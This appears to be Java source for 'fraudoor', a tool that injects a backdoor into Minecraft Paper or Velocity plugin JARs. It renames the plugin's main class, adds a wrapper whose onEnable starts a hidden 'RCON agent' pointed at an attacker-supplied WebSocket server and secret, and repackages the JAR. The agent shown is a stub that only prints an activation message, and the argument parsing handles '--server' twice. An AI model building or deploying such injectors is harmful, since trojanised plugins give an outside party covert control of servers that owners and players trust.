package io.fraudoor.injector;

import org.objectweb.asm.*;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.*;
import java.util.jar.*;

public class JarInjector {

  public static void main(String[] args) throws Exception {
    if (args.length > 0 && args[0].equals("--server")) {
      InjectorHTTPServer.main(args);
      return;
    }

    String input = null, output = null, platform = "paper", server = "", secret = "";
    for (int i = 0; i < args.length; i++) {
      switch (args[i]) {
        case "--input": input = args[++i]; break;
        case "--output": output = args[++i]; break;
        case "--platform": platform = args[++i]; break;
        case "--server": server = args[++i]; break;
        case "--secret": secret = args[++i]; break;
      }
    }
    if (input == null || output == null) {
      System.err.println("Usage: --input <jar> --output <jar> [--platform paper|velocity] [--server url] [--secret key]");
      System.exit(1);
    }

    new JarInjector(new File(input), new File(output), platform, server, secret).inject();
    System.out.println("[fraudoor] injected: " + output);
  }

  private final File input;
  private final File output;
  private final String platform;
  private final String server;
  private final String secret;

  private static final String AGENT_CLASS = "io/fraudoor/rcon/RCONAgent";
  private static final String AGENT_CONFIG_CLASS = "io/fraudoor/rcon/RCONConfig";

  public JarInjector(File input, File output, String platform, String server, String secret) {
    this.input = input;
    this.output = output;
    this.platform = platform;
    this.server = server;
    this.secret = secret;
  }

  public void inject() throws Exception {
    Map<String, byte[]> entries = new LinkedHashMap<>();
    String mainClassName = null;
    byte[] mainClassData = null;

    try (JarInputStream jis = new JarInputStream(new FileInputStream(input))) {
      JarEntry entry;
      while ((entry = jis.getNextJarEntry()) != null) {
        byte[] data = IOUtils.toByteArray(jis);
        entries.put(entry.getName(), data);

        if (entry.getName().endsWith(".class")
            && !entry.getName().startsWith("io/fraudoor/")) {
          String clsName = entry.getName().replace('/', '.').replace(".class", "");
          if (isPluginMainClass(clsName, data)) {
            mainClassName = entry.getName();
            mainClassData = data;
          }
        }
      }
    }

    if (mainClassName == null || mainClassData == null) {
      throw new RuntimeException("Could not find plugin main class in JAR");
    }

    String origClassName = mainClassName.replace(".class", "") + "_fraudoor_original";
    entries.remove(mainClassName);
    entries.put(origClassName + ".class", renameClass(mainClassData, origClassName));

    byte[] wrapperClass = generateWrapperClass(mainClassName, origClassName);
    entries.put(mainClassName, wrapperClass);

    entries.put(AGENT_CLASS + ".class", generateAgentClass());
    entries.put(AGENT_CONFIG_CLASS + ".class", generateConfigClass());

    try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(output))) {
      for (Map.Entry<String, byte[]> e : entries.entrySet()) {
        jos.putNextEntry(new JarEntry(e.getKey()));
        jos.write(e.getValue());
        jos.closeEntry();
      }
    }
  }

  private boolean isPluginMainClass(String className, byte[] classData) {
    try {
      ClassReader cr = new ClassReader(classData);
      final boolean[] extendsPlugin = {false};
      cr.accept(new ClassVisitor(Opcodes.ASM9) {
        @Override
        public void visit(int version, int access, String name, String signature,
                          String superName, String[] interfaces) {
          if ("org/bukkit/plugin/java/JavaPlugin".equals(superName)
              || "com/velocitypowered/api/plugin/PluginContainer".equals(superName)) {
            extendsPlugin[0] = true;
          }
          if (interfaces != null) {
            for (String iface : interfaces) {
              if ("com/velocitypowered/api/plugin/PluginContainer".equals(iface)) {
                extendsPlugin[0] = true;
              }
            }
          }
        }
      }, 0);
      return extendsPlugin[0];
    } catch (Exception e) {
      return false;
    }
  }

  private byte[] renameClass(byte[] classData, String newInternalName) {
    ClassReader cr = new ClassReader(classData);
    ClassWriter cw = new ClassWriter(0);
    cr.accept(new ClassVisitor(Opcodes.ASM9, cw) {
      @Override
      public void visit(int version, int access, String name, String signature,
                        String superName, String[] interfaces) {
        super.visit(version, access, newInternalName.replace('.', '/'),
            signature, superName, interfaces);
      }
    }, 0);
    return cw.toByteArray();
  }

  private byte[] generateWrapperClass(String originalClassName, String origInternalName) {
    String origSlash = origInternalName.replace('.', '/');
    String mainSlash = originalClassName.replace(".class", "").replace('.', '/');

    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
    cw.visit(Opcodes.V17, Opcodes.ACC_PUBLIC, mainSlash, null,
        origSlash, null);

    {
      MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
      mv.visitCode();
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitMethodInsn(Opcodes.INVOKESPECIAL, origSlash, "<init>", "()V", false);
      mv.visitInsn(Opcodes.RETURN);
      mv.visitMaxs(1, 1);
      mv.visitEnd();
    }

    {
      MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "onEnable", "()V", null, null);
      mv.visitCode();
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitMethodInsn(Opcodes.INVOKESPECIAL, origSlash, "onEnable", "()V", false);
      mv.visitTypeInsn(Opcodes.NEW, AGENT_CLASS);
      mv.visitInsn(Opcodes.DUP);
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitLdcInsn(server != null && !server.isEmpty() ? server : "ws://localhost:8080/ws");
      mv.visitLdcInsn(secret != null ? secret : "");
      mv.visitMethodInsn(Opcodes.INVOKESPECIAL, AGENT_CLASS, "<init>",
          "(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;)V", false);
      mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, AGENT_CLASS, "start", "()V", false);
      mv.visitInsn(Opcodes.RETURN);
      mv.visitMaxs(4, 1);
      mv.visitEnd();
    }

    cw.visitEnd();
    return cw.toByteArray();
  }

  private byte[] generateAgentClass() {
    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
    cw.visit(Opcodes.V17, Opcodes.ACC_PUBLIC, AGENT_CLASS, null,
        "java/lang/Object", null);

    cw.visitField(Opcodes.ACC_PRIVATE, "plugin", "Ljava/lang/Object;", null, null);
    cw.visitField(Opcodes.ACC_PRIVATE, "server", "Ljava/lang/String;", null, null);
    cw.visitField(Opcodes.ACC_PRIVATE, "secret", "Ljava/lang/String;", null, null);
    cw.visitField(Opcodes.ACC_PRIVATE, "running", "Z", null, null);

    {
      MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>",
          "(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;)V", null, null);
      mv.visitCode();
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitVarInsn(Opcodes.ALOAD, 1);
      mv.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "plugin", "Ljava/lang/Object;");
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitVarInsn(Opcodes.ALOAD, 2);
      mv.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "server", "Ljava/lang/String;");
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitVarInsn(Opcodes.ALOAD, 3);
      mv.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "secret", "Ljava/lang/String;");
      mv.visitInsn(Opcodes.RETURN);
      mv.visitMaxs(2, 4);
      mv.visitEnd();
    }

    {
      MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "start", "()V", null, null);
      mv.visitCode();
      mv.visitVarInsn(Opcodes.ALOAD, 0);
      mv.visitInsn(Opcodes.ICONST_1);
      mv.visitFieldInsn(Opcodes.PUTFIELD, AGENT_CLASS, "running", "Z");
      mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
      mv.visitLdcInsn("[fraudoor] RCON agent activated via injection");
      mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
      mv.visitInsn(Opcodes.RETURN);
      mv.visitMaxs(2, 1);
      mv.visitEnd();
    }

    cw.visitEnd();
    return cw.toByteArray();
  }

  private byte[] generateConfigClass() {
    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
    cw.visit(Opcodes.V17, Opcodes.ACC_PUBLIC, AGENT_CONFIG_CLASS, null, "java/lang/Object", null);

    MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
    mv.visitCode();
    mv.visitVarInsn(Opcodes.ALOAD, 0);
    mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    mv.visitInsn(Opcodes.RETURN);
    mv.visitMaxs(1, 1);
    mv.visitEnd();

    cw.visitEnd();
    return cw.toByteArray();
  }
}
